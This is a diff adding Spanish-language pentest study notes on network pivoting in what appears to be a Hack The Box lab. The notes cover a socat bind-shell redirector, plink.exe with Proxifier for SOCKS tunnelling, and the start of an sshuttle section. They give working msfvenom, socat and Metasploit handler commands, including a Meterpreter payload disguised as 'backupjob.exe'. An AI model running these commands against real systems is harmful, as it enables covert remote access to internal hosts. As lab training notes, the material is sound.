@@ -699,5 +699,99 @@ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
 >[!Importante] 
 
 Para mas detalle consultar el diagrama completo en: [Laboratorio](src/12_MeterpreterTunnelingLab.html)
+# Socat Redirection con Bind Shell
 
+**Idea general:** es la contraparte del reverse shell redirector, pero con la dirección de la conexión invertida.
 
+- **Reverse shell redirector:** el Windows se conecta hacia afuera, y socat en el pivote reenvía ese tráfico hacia tu atacante.
+- **Bind shell redirector:** el Windows **escucha** en un puerto (no se conecta a nadie), y tú necesitas alcanzarlo desde fuera. Como no puedes llegar directo a esa IP interna, socat en el pivote (Ubuntu) actúa de intermediario.
+
+### Los tres pasos del ejemplo
+
+### Generar el payload bind en el atacante:
+
+```shell
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+```
+
+Crea un `.exe` que, al ejecutarse en el Windows, abrirá un listener local en el puerto `8443` y esperará una conexión entrante.
+
+### Levantar el redirector socat en el pivote (Ubuntu):
+
+```bash
+socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+```
+
+Escucha en `8080` (alcanzable desde tu atacante) y reenvía todo lo que llegue ahí hacia `172.16.5.19:8443` (el Windows, en la red interna).
+
+### Configurar el bind handler en Metasploit (en el atacante):
+
+```shell
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set RHOST 10.129.202.64   # la IP del pivote, no la del Windows
+set LPORT 8080            # el puerto del socat, no el 8443 real
+run
+```
+
+### FLUJO COMPLETO
+
+```shell
+[Metasploit handler] ──conecta──► [Ubuntu:8080 socat] ──reenvía──► [Windows:8443 bind shell]
+```
+# SSH for Windows: plink.exe
+
+### Contexto: cuándo se usa esto
+
+Dos escenarios posibles:
+
+1. **Windows comprometido como pivote**, donde no puedes subir tus propias herramientas sin exponerte — usas _living off the land_: si ya tiene PuTTY instalado (o lo encuentras en un file share), usas `plink.exe` (que viene con PuTTY) en vez de instalar SSH tuyo.
+2. **Windows como tu propio host de ataque**, en vez de Linux — ahí no tienes `ssh -D` nativo (antes de 2018 Windows no traía cliente SSH), así que Plink es el equivalente.
+
+### El flujo completo
+
+```
+[Atacante Windows] ──plink.exe (SSH -D)──► [Pivote: Ubuntu] ──► [Red interna 172.16.5.x]
+      │
+      └─ Proxifier redirige mstsc.exe hacia el SOCKS local
+```
+
+**Paso 1 — Levantar el SOCKS dinámico desde Windows con Plink**
+
+cmd
+
+```cmd
+plink -ssh -D 9050 ubuntu@10.129.15.50
+```
+
+- `plink`: el binario, equivalente a `ssh` pero para Windows (parte de PuTTY).
+- `-ssh`: fuerza el protocolo SSH (Plink también soporta telnet/rlogin, hay que ser explícito).
+- `-D 9050`: igual que en Linux — forward dinámico, abre un proxy SOCKS escuchando en el puerto `9050` de la propia máquina Windows.
+- `ubuntu@10.129.15.50`: el host pivote al que te autenticas.
+
+Esto establece la sesión SSH cifrada entre el Windows atacante y el pivote, exactamente con el mismo mecanismo que vimos en Linux (canales `direct-tcpip` dentro del túnel).
+
+**Paso 2 — El problema: la mayoría de las apps de Windows no saben usar SOCKS directamente**
+
+En Linux resolvías esto con `proxychains`, que intercepta las llamadas de socket de cualquier programa. Windows no tiene un equivalente tan simple a nivel de sistema, así que aquí entra **Proxifier**.
+
+**Paso 3 — Configurar Proxifier**
+
+Proxifier crea un “red tunelizada” para aplicaciones de escritorio, forzándolas a pasar su tráfico por un proxy SOCKS/HTTPS. Configuras un perfil apuntando a:
+
+```
+SOCKS server: 127.0.0.1
+Port: 9050
+```
+
+Esto le dice a Proxifier: “cualquier tráfico que yo decida redirigir, mándalo por el SOCKS que Plink ya levantó”.
+
+**Paso 4 — Lanzar la herramienta final a través del túnel**
+
+Con Proxifier activo, corres `mstsc.exe` (el cliente RDP nativo de Windows) normalmente. Proxifier intercepta su tráfico de red y lo empuja por el SOCKS en `127.0.0.1:9050`, que a su vez va por el túnel SSH hasta el pivote, que reenvía la conexión real hacia el host interno con RDP habilitado.
+
+![Diagram showing network setup: Windows (10.10.15.5) forwards remote port 8080 to local port 80 using Plink SSH Client. Stark SOCKS Listener on port 9050 forwards packets. Victim Server (Ubuntu) and Victim Server (Windows A) with RDP Service at 172.16.5.19.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/158/66-1.png)
+
+# SSH Pivoting with Sshuttle
+
+**Sshuttle** es una herramienta escrita en Python que logra el mismo objetivo que el combo `ssh -D` + `proxychains`, pero de una forma distinta y más transparente: en vez de interceptar las llamadas de socket de cada programa (como hace `proxychains` con `LD_PRELOAD`), **modifica las reglas de `iptables`** de tu propia máquina para redirigir automáticamente _todo_ el tráfico destinado a una subred específica, a través de un túnel SSH hacia el host pivote.
